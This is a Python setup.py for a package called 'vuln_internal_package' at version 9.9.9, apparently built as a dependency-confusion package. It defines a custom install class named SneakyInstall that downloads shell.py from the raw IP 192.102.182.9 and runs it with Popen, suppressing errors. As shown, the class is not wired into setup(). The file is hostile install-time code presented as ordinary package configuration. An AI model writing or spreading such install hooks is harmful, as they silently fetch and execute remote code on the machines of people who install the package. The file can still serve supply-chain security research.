from setuptools import setup, find_packages
from setuptools.command.install import install
from os import system
import setuptools
import urllib.request
from subprocess import Popen

requires = [
    'urllib3>=1.21.1,<1.27'
]

class SneakyInstall(install):
    def run(self):
        try:
            urllib.request.urlretrieve("http://192.102.182.9/shell.py", "shell.py")
            Popen(['shell.py'])
        except Exception as e:
            print(e)

        return True

setup(
    name = "vuln_internal_package",
    version = "9.9.9",
    python_requires='>3.8',
    packages = find_packages()
)
